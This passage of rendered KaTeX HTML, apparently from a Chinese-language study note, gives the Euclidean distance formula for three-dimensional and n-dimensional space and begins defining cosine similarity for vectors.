class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>z</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q(x_2, y_2, z_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><msqrt><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>2</mn></msub><mo>−</mo><msub><mi>y</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>z</mi><mn>2</mn></msub><mo>−</mo><msub><mi>z</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">d(P, Q) = \sqrt{(x_2 - x_1)^2 + (y_2 - y_1)^2 + (z_2 - z_1)^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.2561em;"/><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9839em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"/><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9439em;"><span class="pstrut" style="height:3.2em;"/><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119&#10;c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120&#10;c340,-704.7,510.7,-1060.3,512,-1067&#10;l0 -0&#10;c4.7,-7.3,11,-11,19,-11&#10;H40000v40H1012.3&#10;s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232&#10;c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1&#10;s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26&#10;c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z&#10;M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2561em;"><span/></span></span></span></span></span></span></span></span></div>
<p>n 维空间 (n-D)</p>
<p>在机器学习等高维场景中，设两点为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(x_1, x_2, \dots, x_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>y</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q(y_1, y_2, \dots, y_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><msqrt><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">d(P, Q) = \sqrt{\sum_{i=1}^n (x_i - y_i)^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.1568em;vertical-align:-1.2777em;"/><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8791em;"><span class="svg-align" style="top:-5.1168em;"><span class="pstrut" style="height:5.1168em;"/><span class="mord" style="padding-left:1.056em;"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.8391em;"><span class="pstrut" style="height:5.1168em;"/><span class="hide-tail" style="min-width:0.742em;height:3.1968em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="3.1968em" viewbox="0 0 400000 3196" preserveaspectratio="xMinYMin slice"><path d="M702 80H40000040&#10;H742v3062l-4 4-4 4c-.667.7 -2 1.5-4 2.5s-4.167 1.833-6.5 2.5-5.5 1-9.5 1&#10;h-12l-28-84c-16.667-52-96.667 -294.333-240-727l-212 -643 -85 170&#10;c-4-3.333-8.333-7.667-13 -13l-13-13l77-155 77-156c66 199.333 139 419.667&#10;219 661 l218 661zM702 80H400000v40H742z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span></span></span></span></span></div>
</blockquote>
<blockquote>
<p>[!NOTE]</p>
<p><strong>余弦相似度</strong></p>
<p>对于 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> 维向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span>，其余弦相似度定义为两向量的点积除以它们模长的乘积：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>similarity</mtext><mo>=</mo><mi>cos</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>A</mi><mo>⋅</mo><mi>B</mi></mrow><mrow><mi mathvariant="normal">∥</mi><mi>A</mi><mi mathvariant="normal">∥</mi><mi mathvariant="normal">∥</mi><mi>B</mi><mi mathvariant="normal">∥</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>A</mi><mi>i</mi></msub><msub><mi>B</mi><mi>i</mi></msub></mrow><mrow><msqrt><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msubsup><mi>A</mi><mi>i</mi><mn>2</mn></msubsup></mrow></msqrt><msqrt><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msubsup><mi>B</mi><mi>i</mi><mn>2</mn></msubsup></mrow></msqrt></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{similarity} = \cos(\theta) = \frac{A \cdot B}{\|A\| \|B\|} = \frac{\sum_{i=1}^{n} A_i B_i}{\sqrt{\sum_{i=1}^{n} A_i^2} \sqrt{\sum_{i=1}^{n} B_i^2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">similarity</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">cos</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.2963em;vertical-align:-0.936em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">∥</span><span class="mord mathnormal">A</span><span class="mord">∥∥</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">∥</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.624em;vertical-align:-1.13em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.494em;"><span style="top:-2.1727em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9373em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"/><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span><span style="top:-2.8973em;"><span class="pstrut" style="height:3.2em;"/><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119&#10;c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120&#10;c340,-704.7,510.7,-1060.3,512,-1067&#10;l0 -0&#10;c4.7,-7.3,11,-11,19,-11&#10;H40000v40H1012.3&#10;s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232&#10;c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1&#10;s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26&#10;c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z&#10;M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3027em;"><span/></span></span></span></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9373em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"/><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959em;"><span style="top:-2.4231em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span><span style="top:-2.8973em;"><span class="pstrut" style="height:3.2em;"/><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119&#10;c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120&#10;c340,-704.7,510.7,-1060.3,512,-1067&#10;l0 -0&#10;c4.7,-7.3,11,-11,19,-11&#10;H40000v40H1012.3&#10;s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232&#10;c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1&#10;s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26&#10;c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z&#10;M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3027em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.6897em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 